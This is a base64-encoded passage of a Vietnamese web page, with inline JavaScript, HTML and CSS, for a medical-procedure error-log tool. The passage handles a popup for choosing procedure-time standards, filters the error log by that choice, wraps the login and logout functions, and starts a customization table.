cCBjaOG7jW4gdGjhu51pIGdpYW4iKTsNCiAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZU9wdGlvblBvcHVwJyk7DQogIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogIA0KICAvLyBUaMOqbSBjbGFzcyBzaG93IHNhdSBt4buZdCBraG/huqNuZyB0aOG7nWkgZ2lhbiBuZ+G6r24gxJHhu4MgxJHhuqNtIGLhuqNvIENTUyDDoXAgZOG7pW5nDQogIHNldFRpbWVvdXQoKCkgPT4gew0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgfSwgMTApOw0KfQ0KDQovLyBIw6BtIOG6qW4gcG9wdXANCmZ1bmN0aW9uIGhpZGVUaW1lT3B0aW9uUG9wdXAoKSB7DQogIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVPcHRpb25Qb3B1cCcpOw0KICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogIHNldFRpbWVvdXQoKCkgPT4gew0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogIH0sIDMwMCk7DQp9DQoNCi8vIEjDoG0geOG7rSBsw70ga2hpIGNo4buNbiBt4buZdCB0cm9uZyBoYWkgdMO5eSBjaOG7jW4NCmZ1bmN0aW9uIHNlbGVjdFRpbWVPcHRpb24ob3B0aW9uKSB7DQogIGNvbnNvbGUubG9nKCLEkMOjIGNo4buNbiBvcHRpb246Iiwgb3B0aW9uKTsNCiAgdGltZU9wdGlvblNlbGVjdGVkID0gb3B0aW9uOw0KICBoaWRlVGltZU9wdGlvblBvcHVwKCk7DQogIA0KICAvLyBMxrB1IGzhu7FhIGNo4buNbiB2w6BvIGxvY2FsU3RvcmFnZQ0KICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgndGltZU9wdGlvbicsIG9wdGlvbik7DQogIA0KICAvLyBO4bq/dSDEkcOjIGPDsyBk4buvIGxp4buHdSB0aOG7pyB0aHXhuq10LCBj4bqtcCBuaOG6rXQgbOG6oWkgaGnhu4NuIHRo4buLDQogIGlmICh3aW5kb3cuYWxsUHJvY2VkdXJlcyAmJiB3aW5kb3cuYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KICB9DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB2w6AgbOG7jWMgbOG7l2kgdGjhu51pIGdpYW4gdGhlbyBs4buxYSBjaOG7jW4NCmZ1bmN0aW9uIGZpbHRlclRpbWVFcnJvcnNCeU9wdGlvbihlcnJvcnMpIHsNCiAgaWYgKHRpbWVPcHRpb25TZWxlY3RlZCA9PT0gMSkgew0KICAgIGNvbnNvbGUubG9nKCLEkGFuZyBs4buNYyBs4buXaSB0aOG7nWkgZ2lhbiAtIE9wdGlvbiAxIik7DQogICAgLy8gTOG7jWMgYuG7jyBs4buXaSAixJBp4buBdSB0cuG7iyBi4bqxbmcgdGlhIGjhu5NuZyBuZ2/huqFpIiB2w6AgIsSQaeG7gXUgdHLhu4sgYuG6sW5nIGPDoWMgZMOybmcgxJFp4buHbiB4dW5nIiANCiAgICAvLyBu4bq/dSB0aOG7nWkgZ2lhbiBsw6AgMTAgcGjDunQNCiAgICByZXR1cm4gZXJyb3JzLmZpbHRlcihlcnJvciA9PiB7DQogICAgICBpZiAoZXJyb3IuZGV0YWlscyAmJiBlcnJvci5kZXRhaWxzLnByb2NlZHVyZSkgew0KICAgICAgICBjb25zdCBwcm9jZWR1cmUgPSBlcnJvci5kZXRhaWxzLnByb2NlZHVyZTsNCiAgICAgICAgY29uc3QgYWN0dWFsRHVyYXRpb24gPSBlcnJvci5kZXRhaWxzLmFjdHVhbDsNCiAgICAgICAgDQogICAgICAgIC8vIEtp4buDbSB0cmEgbuG6v3UgbMOgIHRo4bunIHRodeG6rXQgY+G6p24gbOG7jWMgdsOgIHRo4budaSBnaWFuIGzDoCAxMCBwaMO6dA0KICAgICAgICBpZiAoKHByb2NlZHVyZS5pbmNsdWRlcygixJBp4buBdSB0cuG7iyBi4bqxbmcgdGlhIGjhu5NuZyBuZ2/huqFpIikgfHwgDQogICAgICAgICAgICAgcHJvY2VkdXJlLmluY2x1ZGVzKCLEkGnhu4F1IHRy4buLIGLhurFuZyBjw6FjIGTDsm5nIMSRaeG7h24geHVuZyIpKSAmJiANCiAgICAgICAgICAgIGFjdHVhbER1cmF0aW9uID09PSAxMCkgew0KICAgICAgICAgIGNvbnNvbGUubG9nKCLEkMOjIGzhu41jIGzhu5dpOiIsIHByb2NlZHVyZSwgInRo4budaSBnaWFuOiIsIGFjdHVhbER1cmF0aW9uKTsNCiAgICAgICAgICByZXR1cm4gZmFsc2U7IC8vIExv4bqhaSBi4buPIGzhu5dpIG7DoHkNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgcmV0dXJuIHRydWU7IC8vIEdp4buvIGzhuqFpIGPDoWMgbOG7l2kga2jDoWMNCiAgICB9KTsNCiAgfQ0KICANCiAgLy8gTuG6v3UgY2jhu41uIG9wdGlvbiAyLCBnaeG7ryBuZ3V5w6puIHThuqV0IGPhuqMgbOG7l2kNCiAgcmV0dXJuIGVycm9yczsNCn0NCg0KLy8gR2hpIMSRw6ggaMOgbSBkaXNwbGF5RXJyb3JzIMSR4buDIMOhcCBk4bulbmcgYuG7mSBs4buNYw0KY29uc3Qgb3JpZ2luYWxEaXNwbGF5RXJyb3JzID0gZGlzcGxheUVycm9yczsNCmRpc3BsYXlFcnJvcnMgPSBmdW5jdGlvbigpIHsNCiAgY29uc29sZS5sb2coImRpc3BsYXlFcnJvcnMgxJHGsOG7o2MgZ+G7jWksIHRpbWVPcHRpb25TZWxlY3RlZDoiLCB0aW1lT3B0aW9uU2VsZWN0ZWQpOw0KICAvLyDDgXAgZOG7pW5nIGLhu5kgbOG7jWMgbuG6v3UgxJHDoyBjaOG7jW4gb3B0aW9uIDENCiAgaWYgKHRpbWVPcHRpb25TZWxlY3RlZCA9PT0gMSkgew0KICAgIGNvbnN0IGZpbHRlcmVkRXJyb3JzID0gZmlsdGVyVGltZUVycm9yc0J5T3B0aW9uKGVycm9yTG9nKTsNCiAgICANCiAgICAvLyBU4bqhbSB0aOG7nWkgdGhheSB0aOG6vyBlcnJvckxvZyBi4bqxbmcgZmlsdGVyZWRFcnJvcnMNCiAgICBjb25zdCBvcmlnaW5hbEVycm9yTG9nID0gZXJyb3JMb2c7DQogICAgZXJyb3JMb2cgPSBmaWx0ZXJlZEVycm9yczsNCiAgICANCiAgICAvLyBH4buNaSBow6BtIGfhu5FjDQogICAgb3JpZ2luYWxEaXNwbGF5RXJyb3JzKCk7DQogICAgDQogICAgLy8gS2jDtGkgcGjhu6VjIGVycm9yTG9nDQogICAgZXJyb3JMb2cgPSBvcmlnaW5hbEVycm9yTG9nOw0KICB9IGVsc2Ugew0KICAgIC8vIEfhu41pIGjDoG0gZ+G7kWMNCiAgICBvcmlnaW5hbERpc3BsYXlFcnJvcnMoKTsNCiAgfQ0KfTsNCg0KLy8gR2hpIMSRw6ggaMOgbSBmaWx0ZXJCeU9wZXJhdG9yIMSR4buDIMOhcCBk4bulbmcgYuG7mSBs4buNYw0KY29uc3Qgb3JpZ2luYWxGaWx0ZXJCeU9wZXJhdG9yID0gZmlsdGVyQnlPcGVyYXRvcjsNCmZpbHRlckJ5T3BlcmF0b3IgPSBmdW5jdGlvbigpIHsNCiAgY29uc29sZS5sb2coImZpbHRlckJ5T3BlcmF0b3IgxJHGsOG7o2MgZ+G7jWksIHRpbWVPcHRpb25TZWxlY3RlZDoiLCB0aW1lT3B0aW9uU2VsZWN0ZWQpOw0KICAvLyDDgXAgZOG7pW5nIGLhu5kgbOG7jWMgbuG6v3UgxJHDoyBjaOG7jW4gb3B0aW9uIDENCiAgaWYgKHRpbWVPcHRpb25TZWxlY3RlZCA9PT0gMSkgew0KICAgIGNvbnN0IG9wZXJhdG9yRXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpLnZhbHVlOw0KICAgIGNvbnN0IGZpbHRlcmVkRXJyb3JzID0gb3BlcmF0b3JFcnJvciA9PT0gJ2FsbCcgDQogICAgICA/IGVycm9yTG9nIA0KICAgICAgOiBlcnJvckxvZy5maWx0ZXIoZXJyb3IgPT4NCiAgICAgICAgICBlcnJvci5kZXRhaWxzICYmDQogICAgICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvciAmJg0KICAgICAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yRXJyb3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICAgICAgKTsNCiAgICANCiAgICAvLyDDgXAgZOG7pW5nIGLhu5kgbOG7jWMgdGjhu51pIGdpYW4NCiAgICBjb25zdCB0aW1lRmlsdGVyZWRFcnJvcnMgPSBmaWx0ZXJUaW1lRXJyb3JzQnlPcHRpb24oZmlsdGVyZWRFcnJvcnMpOw0KICAgIA0KICAgIC8vIFThuqFtIHRo4budaSB0aGF5IHRo4bq/IGVycm9yTG9nDQogICAgY29uc3Qgb3JpZ2luYWxFcnJvckxvZyA9IGVycm9yTG9nOw0KICAgIGVycm9yTG9nID0gdGltZUZpbHRlcmVkRXJyb3JzOw0KICAgIA0KICAgIC8vIEfhu41pIGjDoG0gZ+G7kWMNCiAgICBvcmlnaW5hbEZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICANCiAgICAvLyBLaMO0aSBwaOG7pWMgZXJyb3JMb2cNCiAgICBlcnJvckxvZyA9IG9yaWdpbmFsRXJyb3JMb2c7DQogIH0gZWxzZSB7DQogICAgLy8gR+G7jWkgaMOgbSBn4buRYw0KICAgIG9yaWdpbmFsRmlsdGVyQnlPcGVyYXRvcigpOw0KICB9DQp9Ow0KDQovLyBIw6BtIGtp4buDbSB0cmEgdsOgIGhp4buDbiB0aOG7iyBwb3B1cCBzYXUga2hpIMSRxINuZyBuaOG6rXANCmZ1bmN0aW9uIGNoZWNrQW5kU2hvd1RpbWVQb3B1cCgpIHsNCiAgY29uc29sZS5sb2coIktp4buDbSB0cmEgaGnhu4NuIHRo4buLIHBvcHVwLCBjdXJyZW50VXNlcjoiLCBjdXJyZW50VXNlcik7DQogIGlmIChjdXJyZW50VXNlciAmJiAhbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3RpbWVPcHRpb24nKSkgew0KICAgIGNvbnNvbGUubG9nKCJIaeG7g24gdGjhu4sgcG9wdXAgY2jhu41uIHRo4budaSBnaWFuIik7DQogICAgLy8gxJDhu6NpIG3hu5l0IGNow7p0IMSR4buDIHRyYW5nIOG7lW4gxJHhu4tuaA0KICAgIHNldFRpbWVvdXQoc2hvd1RpbWVPcHRpb25Qb3B1cCwgMTAwKTsNCiAgfSBlbHNlIHsNCiAgICAvLyDEkMOjIGPDsyBs4buxYSBjaOG7jW4gdHLGsOG7m2MgxJHDsywga2jDtGkgcGjhu6VjDQogICAgdGltZU9wdGlvblNlbGVjdGVkID0gcGFyc2VJbnQobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3RpbWVPcHRpb24nKSkgfHwgMjsNCiAgICBjb25zb2xlLmxvZygixJDDoyBjw7MgbOG7sWEgY2jhu41uIHRyxrDhu5tjOiIsIHRpbWVPcHRpb25TZWxlY3RlZCk7DQogIH0NCn0NCg0KLy8gR2hpIMSRw6ggaMOgbSBjaGVja1NhdmVkTG9naW4gxJHhu4MgdGjDqm0ga2nhu4NtIHRyYSBwb3B1cA0KY29uc3Qgb3JpZ2luYWxDaGVja1NhdmVkTG9naW4gPSBjaGVja1NhdmVkTG9naW47DQpjaGVja1NhdmVkTG9naW4gPSBmdW5jdGlvbigpIHsNCiAgY29uc29sZS5sb2coImNoZWNrU2F2ZWRMb2dpbiDEkcaw4bujYyBn4buNaSIpOw0KICBjb25zdCBzYXZlZFVzZXIgPSBzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJyk7DQogIGlmIChzYXZlZFVzZXIpIHsNCiAgICBjdXJyZW50VXNlciA9IHNhdmVkVXNlcjsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICBpbml0QWZ0ZXJMb2dpbigpOyAvLyBhdXRvLWxvZ2luIG3hu5tpIGxvYWQgZOG7ryBsaeG7h3UNCiAgICANCiAgICAvLyBLaeG7g20gdHJhIGhp4buDbiB0aOG7iyBwb3B1cCBzYXUga2hpIMSRxINuZyBuaOG6rXANCiAgICBzZXRUaW1lb3V0KGNoZWNrQW5kU2hvd1RpbWVQb3B1cCwgNTAwKTsNCiAgfQ0KfTsNCg0KLy8gR2hpIMSRw6ggaMOgbSBlbmFibGVMb2dpbiDEkeG7gyB0aMOqbSBraeG7g20gdHJhIHBvcHVwDQpjb25zdCBvcmlnaW5hbEVuYWJsZUxvZ2luID0gZW5hYmxlTG9naW47DQplbmFibGVMb2dpbiA9IGFzeW5jIGZ1bmN0aW9uKGFjY291bnRzKSB7DQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpOw0KICBjb25zdCB1c2VySW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpOw0KICBjb25zdCBwYXNzSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpOw0KICBjb25zdCBlcnJvckRpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJyk7DQoNCiAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGNvbnN0IHVzZXIgPSB1c2VySW5wdXQudmFsdWUudHJpbSgpOw0KICAgIGNvbnN0IHBhc3MgPSBwYXNzSW5wdXQudmFsdWUudHJpbSgpOw0KICAgIGlmIChhY2NvdW50c1t1c2VyXSAmJiBhY2NvdW50c1t1c2VyXSA9PT0gcGFzcykgew0KICAgICAgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgnbWVkVXNlcicsIHVzZXIpOw0KICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QucmVtb3ZlKCdsb2dpbi1wYWdlJyk7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgZXJyb3JEaXYuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIA0KICAgICAgLy8gR8OhbiBjdXJyZW50VXNlciB2w6Aga2nhu4NtIHRyYSBwb3B1cA0KICAgICAgY3VycmVudFVzZXIgPSB1c2VyOw0KICAgICAgc2V0VGltZW91dChjaGVja0FuZFNob3dUaW1lUG9wdXAsIDEwMCk7DQogICAgfSBlbHNlIHsNCiAgICAgIGVycm9yRGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIH0NCiAgfSk7DQp9Ow0KDQovLyBHaGkgxJHDqCBow6BtIGxvZ291dCDEkeG7gyB4w7NhIGzhu7FhIGNo4buNbiB0aOG7nWkgZ2lhbg0KY29uc3Qgb3JpZ2luYWxMb2dvdXQgPSBsb2dvdXQ7DQpsb2dvdXQgPSBmdW5jdGlvbigpIHsNCiAgLy8gWMOzYSBs4buxYSBjaOG7jW4gdGjhu51pIGdpYW4NCiAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3RpbWVPcHRpb24nKTsNCiAgdGltZU9wdGlvblNlbGVjdGVkID0gbnVsbDsNCiAgY29uc29sZS5sb2coIsSQw6MgeMOzYSBs4buxYSBjaOG7jW4gdGjhu51pIGdpYW4iKTsNCiAgDQogIC8vIEfhu41pIGjDoG0gZ+G7kWMNCiAgb3JpZ2luYWxMb2dvdXQoKTsNCn07DQoNCi8vIEtow7RpIHBo4bulYyBs4buxYSBjaOG7jW4gdGjhu51pIGdpYW4ga2hpIHThuqNpIHRyYW5nDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQogIGNvbnNvbGUubG9nKCJET00gbG9hZGVkLCBraeG7g20gdHJhIGzhu7FhIGNo4buNbiB0aOG7nWkgZ2lhbiIpOw0KICBjb25zdCBzYXZlZE9wdGlvbiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0aW1lT3B0aW9uJyk7DQogIGlmIChzYXZlZE9wdGlvbikgew0KICAgIHRpbWVPcHRpb25TZWxlY3RlZCA9IHBhcnNlSW50KHNhdmVkT3B0aW9uKTsNCiAgICBjb25zb2xlLmxvZygixJDDoyBraMO0aSBwaOG7pWMgbOG7sWEgY2jhu41uOiIsIHRpbWVPcHRpb25TZWxlY3RlZCk7DQogIH0NCn0pOw0KDQovLyBIw6BtIGtp4buDbSB0cmEgdGjhu6cgY8O0bmcgcG9wdXAgKGTDuW5nIMSR4buDIHRlc3QpDQpmdW5jdGlvbiB0ZXN0VGltZVBvcHVwKCkgew0KICBjb25zb2xlLmxvZygiVGVzdCBwb3B1cCB0aOG7pyBjw7RuZyIpOw0KICBzaG93VGltZU9wdGlvblBvcHVwKCk7DQp9DQoNCi8vIFRow6ptIG7DunQgdGVzdCB2w6BvIGdpYW8gZGnhu4duIHThuqFtIHRo4budaQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KICAvLyBUaMOqbSBuw7p0IHRlc3QgdsOgbyB0b3AtYnV0dG9uLWdyb3VwIChjaOG7iSDEkeG7gyBkZWJ1ZykNCiAgY29uc3QgdG9wQnV0dG9uR3JvdXAgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudG9wLWJ1dHRvbi1ncm91cCcpOw0KICBpZiAodG9wQnV0dG9uR3JvdXApIHsNCiAgICBjb25zdCB0ZXN0QnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7DQogICAgdGVzdEJ0bi5jbGFzc05hbWUgPSAnYnRuJzsNCiAgICB0ZXN0QnRuLmlubmVySFRNTCA9ICdDaOG7jW4gVGjhu51pIEdpYW4nOw0KICAgIHRlc3RCdG4ub25jbGljayA9IHRlc3RUaW1lUG9wdXA7DQogICAgdG9wQnV0dG9uR3JvdXAuYXBwZW5kQ2hpbGQodGVzdEJ0bik7DQogIH0NCn0pOw0KDQovLyDEkMOzbmcgcG9wdXAga2hpIGNsaWNrIHJhIG5nb8OgaQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihlKSB7DQogIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVPcHRpb25Qb3B1cCcpOw0KICBpZiAoZS50YXJnZXQgPT09IHBvcHVwKSB7DQogICAgaGlkZVRpbWVPcHRpb25Qb3B1cCgpOw0KICB9DQp9KTsNCg0KLy8gxJDDs25nIHBvcHVwIGLhurFuZyBwaMOtbSBFU0MNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBmdW5jdGlvbihlKSB7DQogIGlmIChlLmtleSA9PT0gJ0VzY2FwZScpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lT3B0aW9uUG9wdXAnKTsNCiAgICBpZiAocG9wdXAuc3R5bGUuZGlzcGxheSA9PT0gJ2ZsZXgnKSB7DQogICAgICBoaWRlVGltZU9wdGlvblBvcHVwKCk7DQogICAgfQ0KICB9DQp9KTsNCjwvc2NyaXB0Pg0KPCEtLSBQT1BVUCBDSOG7jE4gVEjhu5xJIEdJQU4gVEjhu6YgVEhV4bqsVCAtLT4NCjwhLS0gUE9QVVAgQ0jhu4xOIFRI4bucSSBHSUFOIFRI4bumIFRIVeG6rFQgLS0+DQo8ZGl2IGlkPSJ0aW1lT3B0aW9uUG9wdXAiIGNsYXNzPSJ0aW1lLW9wdGlvbi1wb3B1cCI+DQogIDxkaXYgY2xhc3M9InRpbWUtb3B0aW9uLWNvbnRlbnQiPg0KICAgIDxoMz5DaOG7jW4gY+G6pXUgaMOsbmggdGjhu51pIGdpYW4gdGjhu6cgdGh14bqtdCAoPGZvbnQgY29sb3I9InJlZCI+PGI+MzU1My9RxJAtQllUPC9iPjwvZm9udD4pPC9oMz4NCiAgIA0KICAgIA0KICAgIDxkaXYgY2xhc3M9InRpbWUtb3B0aW9uLWJ1dHRvbnMiPg0KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJzZWxlY3RUaW1lT3B0aW9uKDEpIj4NCiAgICAgICAgSOG7k25nIG5nb+G6oWksIMSQaeG7h24geHVuZzogMTAgdsOgIDE1IHBow7p0DQogICAgICA8L2J1dHRvbj4NCiAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0ic2VsZWN0VGltZU9wdGlvbigyKSI+DQogICAgICAgIEjhu5NuZyBuZ2/huqFpLCDEkGnhu4duIHh1bmc6IDE1IHBow7p0DQogICAgICA8L2J1dHRvbj4NCiAgICA8L2Rpdj4NCiAgICANCiAgICA8cCBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZm9udC1zaXplOiAxMnB4OyBjb2xvcjogIzY2NjsiPg0KICAgICAgTOG7sWEgY2jhu41uIG7DoHkgc+G6vSDhuqNuaCBoxrDhu59uZyDEkeG6v24gdmnhu4djIGhp4buDbiB0aOG7iyBs4buXaSB0aOG7nWkgZ2lhbiB0aOG7pyB0aHXhuq10DQoJICA8YnIvPg0KPGRpdiBjbGFzcz0ibGlzdDEiPjxjZW50ZXI+PGZvbnQgY29sb3I9InJlZCI+PGI+UuG6pXQgeGluIGzhu5dpIHbDrCB0aMO0bmcgYsOhbyBsw6BtIHBoaeG7gW4gITwvYj48L2ZvbnQ+PC9jZW50ZXI+DQpU4bqhaSBk4buvIGxp4buHdSBxdcOhIGzhu5tuLCBu4bq/dSBt4bq3YyDEkeG7i25oIDE1IHBow7p0IG5oxrBuZyBjw7JuIGThu68gbGnhu4d1IGPFqSAxMCBwaMO6dCBz4bq9IGhp4buDbiB0aOG7iyByYSBi4bqjbmcgc2FpIHF1w6Egbmhp4buBdTxici8+DQpE4bqrbiB04bubaSBxdcOhIHThuqNpIG3DoXkgY2jhu6cgbMOgbSB04buRbiB0w6BpIG5ndXnDqm4gbcOgIMSRaeG7gXUgxJHDsyBsw6Agc2FpIGzhuqdtIGtow7RuZyDEkcOhbmcgbeG6r2MgcGjhuqNpPC9kaXY+DQogICAgPC9wPg0KICA8L2Rpdj4NCjwvZGl2Pg0KPHN0eWxlPi8qIFBPUFVQIENI4buMTiBUSOG7nEkgR0lBTiBUSOG7piBUSFXhuqxUICovDQoudGltZS1vcHRpb24tcG9wdXAgew0KICBwb3NpdGlvbjogZml4ZWQ7DQogIHRvcDogMDsNCiAgbGVmdDogMDsNCiAgd2lkdGg6IDEwMCU7DQogIGhlaWdodDogMTAwJTsNCiAgYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjcpOw0KICBkaXNwbGF5OiBub25lOyAvKiBN4bq3YyDEkeG7i25oIOG6qW4gKi8NCiAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogIHotaW5kZXg6IDEwMDAwMDsgLyogVMSDbmcgei1pbmRleCBy4bqldCBjYW8gKi8NCn0NCg0KLnRpbWUtb3B0aW9uLXBvcHVwLnNob3cgew0KICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7IC8qIFF1YW4gdHLhu41uZzogZMO5bmcgIWltcG9ydGFudCAqLw0KfQ0KDQoudGltZS1vcHRpb24tY29udGVudCB7DQogIGJhY2tncm91bmQ6IHdoaXRlOw0KICBwYWRkaW5nOiAzMHB4Ow0KICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICBib3gtc2hhZG93OiAwIDAgMzBweCByZ2JhKDAsMCwwLDAuNSk7DQogIG1heC13aWR0aDogNTAwcHg7DQogIHdpZHRoOiA5MCU7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgei1pbmRleDogMTAwMDAxOw0KICBwb3NpdGlvbjogcmVsYXRpdmU7DQp9DQoNCi50aW1lLW9wdGlvbi1jb250ZW50IGgzIHsNCiAgbWFyZ2luLXRvcDogMDsNCiAgY29sb3I6ICMzNDk4ZGI7DQogIGZvbnQtc2l6ZTogMjJweDsNCn0NCg0KLnRpbWUtb3B0aW9uLWJ1dHRvbnMgew0KICBkaXNwbGF5OiBmbGV4Ow0KICBnYXA6IDE1cHg7DQogIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICBtYXJnaW4tdG9wOiAyMHB4Ow0KICBmbGV4LXdyYXA6IHdyYXA7DQp9DQoNCi50aW1lLW9wdGlvbi1idG4gew0KICBwYWRkaW5nOiAxMnB4IDI0cHg7DQogIGJvcmRlcjogbm9uZTsNCiAgYm9yZGVyLXJhZGl1czogNnB4Ow0KICBiYWNrZ3JvdW5kOiAjMzQ5OGRiOw0KICBjb2xvcjogd2hpdGU7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICBjdXJzb3I6IHBvaW50ZXI7DQogIHRyYW5zaXRpb246IGJhY2tncm91bmQgMC4zczsNCiAgbWluLXdpZHRoOiAyMDBweDsNCiAgZm9udC1zaXplOiAxNHB4Ow0KfQ0KDQoudGltZS1vcHRpb24tYnRuOmhvdmVyIHsNCiAgYmFja2dyb3VuZDogIzI5ODBiOTsNCn08L3N0eWxlPg0KPCEtLSBQT1BVUCBUVeG7siBCSeG6vk4gVEjhu6YgVEhV4bqsVCAtLT4NCjxkaXYgaWQ9ImN1c3RvbWl6ZU1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTA2MDsiPg0KICA8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIiBvbmNsaWNrPSJjbG9zZUN1c3RvbWl6ZVBhbmVsKCkiPjwvZGl2Pg0KICA8ZGl2IGNsYXNzPSJtb2RhbC1iYXNlIG1vZGFsLXNtYWxsIj4NCiAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjsNCiAgICAgICAgICAgIHBhZGRpbmc6MTRweCAxNnB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNlNWU3ZWIiPg0KICA8aDMgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxOHB4Ij5C4bqjbmcgVHXhu7MgYmnhur9uIFRo4bunIHRodeG6rXQ8L2gzPg0KICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpmbGV4LWVuZDtnYXA6NnB4OyI+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0ic2hvd05vUGVybWlzc2lvbigpIg0KICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjhweCAxNHB4O2ZvbnQtc2l6ZToxM3B4O2JvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgVGjDqm0NCiAgPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VDdXN0b21pemVQYW5lbCgpIg0KICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjhweCAxNHB4O2ZvbnQtc2l6ZToxM3B4O2JvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgxJDDs25nDQogIDwvYnV0dG9uPg0KPC9kaXY+DQo8L2Rpdj4NCiAgICA8ZGl2IHN0eWxlPSJwYWRkaW5nOjBweCAxNnB4Ij4NCiAgICANCiAgICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJ3aWR0aDoxMDAlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6NjBweCI+U1RUPC90aD4NCiAgICAgICAgICAgIDx0aD5UaOG7pyBUaHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6MTMwcHgiPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6MTEwcHgiPkNodeG6qW4gYuG7izwvdGg+DQogICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5IGlkPSJjdXN0b21pemVCb2R5Ij48L3R